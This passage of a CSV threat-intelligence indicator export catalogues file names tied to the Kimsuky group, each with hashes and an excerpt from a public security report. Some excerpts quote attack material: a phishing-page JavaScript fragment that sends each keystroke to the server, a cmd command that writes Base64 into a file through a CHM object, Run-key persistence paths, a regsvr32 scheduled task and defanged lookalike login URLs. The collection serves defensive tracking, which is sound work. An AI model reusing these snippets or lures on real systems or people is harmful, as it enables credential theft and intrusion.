“Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:61fa34f377227a871724865bf843b43cef5142ab1e4f20df65c0b244e6bd5720,observation--sha256:ab1f41281df4cab4f5aca5a60d67206c7d00164658d642ccda40c07269542d6a,file-name,Chairman.exe,Chairman.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 85}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Connect to 17:24:22 211.249.220.24:443 (Table 48) Malware behavior log of 14*.10*.23*.21*(US) mshta.exe Operation Covert Stalker Report process 85 17:24:22 N/A N/A Submit v.doc.exe 2023-07-14 N/A It is designed to download and execute malicious code, but at the time of analysis, it is converted into a decoy file and malicious code as shown below (Figure 66). Deletes executable mshta.exe Myeon Golf Chairman.exe The malicious code in the above (Table 48), the malicious code disclosed on the ASEC b",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b8fffd779cea8ae0e90f6ca2f068bbc5c8107dd1546360a056cd1c4b4352559e,observation--sha256:09b6e4cbc848976455152da17caefd9ea02cd6924114399ef7f5b0fbb42aa4d0,file-name,Clear.bat,Clear.bat,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The Lazarus organization created and distributed the WannaCryptor ransomware by exploiting the MS17-010 vulnerability included in the Eternal Blue package, causing great damage worldwide in a number of fields including transportation, aviation, IT, medical care, administration, and culture. Yes. 32 The Eternal Blue package is a hacking tool developed by the NSA for the purpose of espionage. It was released to the world by the ShadowBrokers organization in April 2017 and has been used by numerous",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:661faf3575630d0c0c5e5efcef016c869f8838da33b46285d072de98f377b1f6,observation--sha256:aadccfb36cc28362f6aa52b1dd55faa9e6e4c40a8b56dbdef307189c1ba40930,file-name,Command.pdf,Command.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b822e27edf4f3b479292f72fac33c3fc9a6b5e38752b1c39163cf6037667506f,observation--sha256:f693203c5dcf9ad0938dbb221237f5e54ad972ae232d2a23df4f76fd7a74cb8a,file-name,CreateDC.pdb,CreateDC.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:b822e27edf4f3b479292f72fac33c3fc9a6b5e38752b1c39163cf6037667506f,observation--sha256:8580f97dab33da0a74d830ec8acefcfe4672a1547ee8c3948ade4a1d1b9d35fd,file-name,CreateDC.pdb,CreateDC.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:2c3409d4dd1852f5375dd26c67c5018b74b6f9a786e056154c948f31e5cd8078,observation--sha256:edc4a65d9762e497f7d78f728f8a82d0799c53e3fa073659c7c434ad235367ba,file-name,DLL.pdb,DLL.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:2c3409d4dd1852f5375dd26c67c5018b74b6f9a786e056154c948f31e5cd8078,observation--sha256:6fd5b9800596055b1b423c60beed35bfce1af945501b324fa47df5456801337b,file-name,DLL.pdb,DLL.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:45c752720e9e6c805def2b0038299e648da72748f2646b1757d7120c02b2f5bf,observation--sha256:1baaf312a22c5309100242dbde907131a74114f6b89f9ae1d7a67c989ec62427,file-name,Defense)-new.hwp,Defense)-new.hwp,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9c6d0ddfd94f6c4f6a518b795bab332c3554d09d477f3284ea277d96d2a322d0,observation--sha256:7c3128f9747b141152491f776ff112efcefda2265bce4ded2480a14e99a24eae,file-name,Details.pdf,Details.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:19941de7cb9d0ac45f39771a371f0d79aafce6c3ba1f09d23aa08f8ce18fa369,observation--sha256:5109233bded79e73d24c4f0fce3b703a91f3db8f997cb2aab4e5d04c7048a507,file-name,DigiBytewhitepaper.chm,DigiBytewhitepaper.chm,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:f83026df003817ffa72a13646be6197febef4486560c06829497934fad44e300,observation--sha256:4bb56b4a48728de25cb78062143b1aaf79b40b2c89e4bb7fcdeaa7341ab778d1,file-name,Docs.jse,Docs.jse,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 11}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3.2. sgic_info.html ○CHM파일을실행할경우, 내부에포함되어있는HTML파일이실행됩니다.이때, HTML파일의하단에존재하는악성스크립트가윈도우도움말실행프로그램인hh.exe 를통해CHM파일을“C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다. [그림3-4] HTML내부스크립트 [그림3-5] 디컴파일탐지 Genians SecurityCenter 10",
1.0.0,actor--kimsuky,artifact--sha256:f83026df003817ffa72a13646be6197febef4486560c06829497934fad44e300,observation--sha256:12bb7e59fdd3426dc2a242d938b0c9b9df26f3817d7ae0706811c4b9045ad079,file-name,Docs.jse,Docs.jse,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 12}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 3.3. Docs.jse ○JSE파일은JavaScript 파일의소스코드를보호하기위해Microsoft 에서개발한인코딩방법으로난독화된파일입니다. GitHub 에공개되어있는디코딩도구인scrdec18-VC8.exe 을통해원본코드를확인할수있습니다. 4 [그림3-6] 인코딩된JSE코드 4 scrdec18-VC8.exe Genians SecurityCenter 11,
1.0.0,actor--kimsuky,artifact--sha256:f83026df003817ffa72a13646be6197febef4486560c06829497934fad44e300,observation--sha256:5d3dc7dfd4b4770d98c652421a96ddddc4c0debec028cc783ce038b326ca1c78,file-name,Docs.jse,Docs.jse,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 2}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport - 목차(CONTENTS) - 1. 개요(Overview)...........................................................................21.1. 위협식별(Threat Hunting)............................................................... 21.2. 공격전술및전략유형(TTPs)............................................................. 3 2. 공격시나리오(AttackScenario)....................................................32.1. 공격흐름도(AttackFlowchart)..........................................................32.2. 초기접근단계-피싱(Initial Acces,
1.0.0,actor--kimsuky,artifact--sha256:f83026df003817ffa72a13646be6197febef4486560c06829497934fad44e300,observation--sha256:5ba53ab953267cdbc55918098f3e59cb14bd81ba3223f74831becde59adee4a4,file-name,Docs.jse,Docs.jse,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:0e4c029a53107c22b859b315100c4fa4c2806e33dec22f499ad39e8c71d59021,observation--sha256:0dabb8d8dea7f4cc50ce877eda6113aaaed332b80dcf501d499a28852a8f3c84,file-name,Document.dat,Document.dat,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:0e4c029a53107c22b859b315100c4fa4c2806e33dec22f499ad39e8c71d59021,observation--sha256:ba195752720a8cd5d4aa3fd4dc939cb53be3ed5612430ec1b12bd855d20def77,file-name,Document.dat,Document.dat,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 55}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.9. HTML코드유사도 ○ HTML 파일의 경우, VBS 1/2, JSE 1 유형 모두 코드 구조는 유사하지만, 악성스크립트파일로VBS 파일에서JSE 파일을사용하는변화를확인할수있습니다. ○또한, JSE 2 유형부터는HTML 파일에악성스크립트를포함시키지않고악성JSE파일 자체를 CHM 파일에 컴파일해 사용했습니다. 그에 따라 HTML 코드도 달라진것을확인할수있습니다. VBS1 JSE1 <OBJECTid=shortcutclassid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" width=1height=1><PARAMname=""Command"" value=""ShortCut""><PARAMname=""Button"" value=""Bitmap:shortcut""><PARAMname=""Item1"" value=',cmd, /cecho[BASE64Code] >""%USERPROFILE%\Links\Document.dat"" &",
1.0.0,actor--kimsuky,artifact--sha256:a20eae10cc5854a65e95d021a3cf6d964b97e884a3bcc1fcead7e548dfbd5b84,observation--sha256:d3d100fc0f8cd38dc348bd6d9329dd6217634892e6d96611e7707b97d7936d33,file-name,Document.jse,Document.jse,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:a20eae10cc5854a65e95d021a3cf6d964b97e884a3bcc1fcead7e548dfbd5b84,observation--sha256:eea700108604ac5e8a6a1069e4fd39ee62e270de7164809bd25c34499b707db4,file-name,Document.jse,Document.jse,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 55}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.9. HTML코드유사도 ○ HTML 파일의 경우, VBS 1/2, JSE 1 유형 모두 코드 구조는 유사하지만, 악성스크립트파일로VBS 파일에서JSE 파일을사용하는변화를확인할수있습니다. ○또한, JSE 2 유형부터는HTML 파일에악성스크립트를포함시키지않고악성JSE파일 자체를 CHM 파일에 컴파일해 사용했습니다. 그에 따라 HTML 코드도 달라진것을확인할수있습니다. VBS1 JSE1 <OBJECTid=shortcutclassid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" width=1height=1><PARAMname=""Command"" value=""ShortCut""><PARAMname=""Button"" value=""Bitmap:shortcut""><PARAMname=""Item1"" value=',cmd, /cecho[BASE64Code] >""%USERPROFILE%\Links\Document.dat"" &",
1.0.0,actor--kimsuky,artifact--sha256:78a4cf74526ab996dcc62321eb3f39e961ba331e1083b7f64e0703391b08e827,observation--sha256:558b9731cec254b4e6baa60a6f2c6a200c0c9de5573818c36c8e7839c2486c01,file-name,Document.vbs,Document.vbs,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:78a4cf74526ab996dcc62321eb3f39e961ba331e1083b7f64e0703391b08e827,observation--sha256:29ecfac53ba5cb71de6ea22edd498ddb20b06be2fc00644bd98e7ce5b591184f,file-name,Document.vbs,Document.vbs,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 55}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.9. HTML코드유사도 ○ HTML 파일의 경우, VBS 1/2, JSE 1 유형 모두 코드 구조는 유사하지만, 악성스크립트파일로VBS 파일에서JSE 파일을사용하는변화를확인할수있습니다. ○또한, JSE 2 유형부터는HTML 파일에악성스크립트를포함시키지않고악성JSE파일 자체를 CHM 파일에 컴파일해 사용했습니다. 그에 따라 HTML 코드도 달라진것을확인할수있습니다. VBS1 JSE1 <OBJECTid=shortcutclassid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" width=1height=1><PARAMname=""Command"" value=""ShortCut""><PARAMname=""Button"" value=""Bitmap:shortcut""><PARAMname=""Item1"" value=',cmd, /cecho[BASE64Code] >""%USERPROFILE%\Links\Document.dat"" &",
1.0.0,actor--kimsuky,artifact--sha256:eb96dafcb1280763a1efd61904b878b84287b5e2f471e97cb0a649fb471fe461,observation--sha256:b93affac4c9c9c988be8c0308f97245de52e08b9f428710243b20035a7575a0e,file-name,Download.php,Download.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ Temp folder image File, Kakao (Daum) phishing mailer As a result of deactivation and analysis, malicious macros were present. (Analysis data) North Korea's position on the use of nuclear force as seen through the April 25 military parade and When executed, additional malicious code is downloaded and executed, and the structure is the same as ""(Figure 26) Malicious code infection process"" above . [+] Joint security advisory from the National Intelligence Service (NIS) and the German Office for ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:eb96dafcb1280763a1efd61904b878b84287b5e2f471e97cb0a649fb471fe461,observation--sha256:f3078a1263cfdc666f79fe51ff4df4ad0670caf29e0744156f7c48b1de34a0cd,file-name,Download.php,Download.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://nidlogin.navernnail.com/nidlogin.login?mode=form&url=hx xps%3A%2F%2Fwww.naver.com&locale=ko_KR&svctype=1&otp= hxxps://accounts.googlernails.com/signin/v2/identifier?hl=en&passiv e=true&continue=hxxps%3A%2F%2Fwww.google.com%2F&ec=GAZ AmgQ&flowName=GlifWebSignIn&flowEntry=ServiceLogin&otp= Based on the analysis of espoofer-master_naver.zip so far, the process of sending phishing emails is summarized as shown below (Figure 32). Using the stolen account information, the hacked target's email",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:eb96dafcb1280763a1efd61904b878b84287b5e2f471e97cb0a649fb471fe461,observation--sha256:b124921a3e40d75ae0ce07aeec30374e46592f44feb487f0cee5d53c41cb88c3,file-name,Download.php,Download.php,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:eb96dafcb1280763a1efd61904b878b84287b5e2f471e97cb0a649fb471fe461,observation--sha256:9c932b401840dc222dbf6d3f8d4b069e65e3b2bce60e6fdad57479448081ddb0,file-name,Download.php,Download.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:891bf9fe5edccfabf73a6f56dd4574e6e90db9f46c5f2dc12248d37a6972b4c7,observation--sha256:3b9251eced3de6a34b67ba493dcf59c5b4f0f6c651976d42308ebd815e2e06b5,file-name,Driverdriver.cfg,Driverdriver.cfg,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:891bf9fe5edccfabf73a6f56dd4574e6e90db9f46c5f2dc12248d37a6972b4c7,observation--sha256:7e398e4325b81446a5a4783be2866a412bcdfe8abf336c5ffb052a2d56ee9215,file-name,Driverdriver.cfg,Driverdriver.cfg,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through 